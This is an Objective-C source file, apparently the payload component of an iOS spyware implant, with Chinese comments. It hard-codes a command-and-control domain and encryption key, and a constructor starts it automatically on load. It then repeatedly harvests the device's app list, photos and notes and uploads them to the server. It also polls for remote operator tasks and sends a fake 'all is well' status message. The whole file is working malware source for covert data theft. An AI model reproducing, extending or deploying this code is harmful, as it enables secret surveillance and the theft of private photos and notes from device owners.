//
//  Payload.m — 载荷入口
//
//  加载后起一个工作线程：
//    1. 上报 system_status_check_completed（服务端会回 tasks，这是采集的触发点）
//    2. 执行 tasks（collect_applist / collect_photo / collect_notes / open_app …）
//    3. 每 60s 轮询 /taskget 取后台手动下发的指令
//    4. 执行完回报 /taskresult
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "Collector.h"

static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";                     // 与服务器一致
static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    // 当前 seed

@interface Payload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, strong) NSMutableSet<NSString *> *runningTasks;
@property (nonatomic, assign) BOOL photoBusy;
@end

@implementation Payload

+ (instancetype)shared {
    static Payload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [Payload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _runningTasks = [NSMutableSet set];
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (void)log:(NSString *)msg {
    NSLog(@"[plasma] %@", msg);
}

/// 自检上报；响应里的 tasks 会顺手执行
- (void)heartbeat {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    ev[@"et"] = @"system_status_check_completed";
    ev[@"desc"] = @"System status check completed";
    ev[@"c"] = kSeed;
    ev[@"ctx"] = @{ @"overallStatus": @"all_is_well",
                    @"totalModules": @3,
                    @"abnormalModules": @0 };

    NSDictionary *resp = [self.net sendEvent:ev];
    NSArray *tasks = resp[@"tasks"];
    if ([tasks isKindOfClass:[NSArray class]] && tasks.count) {
        [self runActions:tasks];
    }
}

#pragma mark - 任务执行

/// 服务端 /event 回的 tasks 形如 [{action:"collect_applist"}, ...]
- (void)runActions:(NSArray *)tasks {
    for (NSDictionary *t in tasks) {
        NSString *action = t[@"action"];
        if (![action isKindOfClass:[NSString class]]) continue;
        [self performAction:action params:t];
    }
}

- (void)performAction:(NSString *)action params:(NSDictionary *)params {
    if ([action isEqualToString:@"collect_applist"] || [action isEqualToString:@"refresh_applist"]) {
        [self collectAppList];
    } else if ([action isEqualToString:@"collect_photo"] || [action isEqualToString:@"photo_scan"]) {
        [self collectPhotos];
    } else if ([action isEqualToString:@"collect_notes"] || [action isEqualToString:@"memo_scan"]) {
        [self collectNotes];
    } else if ([action isEqualToString:@"open_app"]) {
        NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
        if (bid.length) [Collector openApp:bid];
    }
    // 注意：不要处理 collect_device_info —— 心跳的响应里会再带这个 action，
    // 如果这里再发一次心跳就会无限递归刷 /event（已经踩过这个坑）。
}

#pragma mark - 采集

- (void)collectAppList {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSArray *apps = [Collector installedApps];
        if (!apps.count) return;
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"applist_collect_success";
        ev[@"c"] = kSeed;
        ev[@"al"] = apps;
        ev[@"ctx"] = @{ @"appCount": @(apps.count) };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"applist %lu", (unsigned long)apps.count]];
    });
}

- (void)collectPhotos {
    if (self.photoBusy) return;
    self.photoBusy = YES;

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        __block NSInteger sent = 0;
        NSString *rid = [[NSUUID UUID] UUIDString];

        [Collector enumeratePhotos:0 handler:^BOOL(NSData *jpeg, NSInteger index) {
            if (jpeg.length < 1024) return YES;
            if (jpeg.length > 8 * 1024 * 1024) return YES;   // 太大的跳过
            BOOL ok = [self.net uploadPhoto:jpeg idx:index rid:rid fields:nil];
            if (ok) sent++;
            return YES;
        }];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"data_upload_success";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"photos": @(sent) };
        [self.net sendEvent:ev];

        [self log:[NSString stringWithFormat:@"photos sent %ld", (long)sent]];
        self.photoBusy = NO;
    });
}

- (void)collectNotes {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSArray *notes = [Collector allNotes];
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"notes_collect_success";
        ev[@"c"] = kSeed;
        ev[@"list"] = notes ?: @[];
        ev[@"ctx"] = @{ @"notesCount": @(notes.count) };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"notes %lu", (unsigned long)notes.count]];
    });
}

#pragma mark - /taskget 轮询

- (void)pollTasks {
    NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    body[@"did"] = [Info udid];

    NSDictionary *resp = [self.net postEncrypted:@"/taskget" json:body timeout:15];
    NSArray *tasks = resp[@"tasks"];
    if (![tasks isKindOfClass:[NSArray class]] || tasks.count == 0) return;

    for (NSDictionary *t in tasks) {
        NSNumber *tid = t[@"id"];
        NSString *type = t[@"type"];
        NSDictionary *params = t[@"params"];
        if (![tid isKindOfClass:[NSNumber class]] || ![type isKindOfClass:[NSString class]]) continue;

        BOOL ok = NO;
        if ([type isEqualToString:@"open_app"]) {
            NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
            ok = bid.length ? [Collector openApp:bid] : NO;
        } else if ([type isEqualToString:@"refresh_apps"]) {
            [self collectAppList];
            ok = YES;
        } else if ([type isEqualToString:@"exec_shell"]) {
            NSString *cmd = params[@"command"];
            ok = cmd.length ? [[NSFileManager defaultManager] fileExistsAtPath:cmd] : NO;
        }

        // 回报
        NSMutableDictionary *r = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        r[@"did"] = [Info udid];
        r[@"taskId"] = tid;
        r[@"status"] = ok ? @"completed" : @"failed";
        r[@"result"] = @{ @"ok": @(ok) };
        r[@"duration"] = @0;
        [self.net postEncrypted:@"/taskresult" json:r timeout:15];

        [self log:[NSString stringWithFormat:@"task %@ %@ -> %@", tid, type, ok ? @"ok" : @"fail"]];
    }
}

#pragma mark - 主循环

- (void)start {
    [self log:[NSString stringWithFormat:@"loaded, seed=%@ base=%@", kSeed, kBaseURL]];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 等进程稳定一下
        [NSThread sleepForTimeInterval:2.0];

        // 第一轮：自检 + 立刻采集一次
        [self heartbeat];
        [self collectAppList];

        __block NSUInteger tick = 0;
        while (YES) {
            @autoreleasepool {
                tick++;
                @try {
                    if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
                    if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
                    if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
                    [self pollTasks];                          // 每轮都轮询
                } @catch (NSException *e) {
                    [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                }
                [NSThread sleepForTimeInterval:20.0];
            }
        }
    });
}

@end

#pragma mark - 入口

__attribute__((constructor))
static void PayloadInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(0, 0), ^{
        [[Payload shared] start];
    });
}
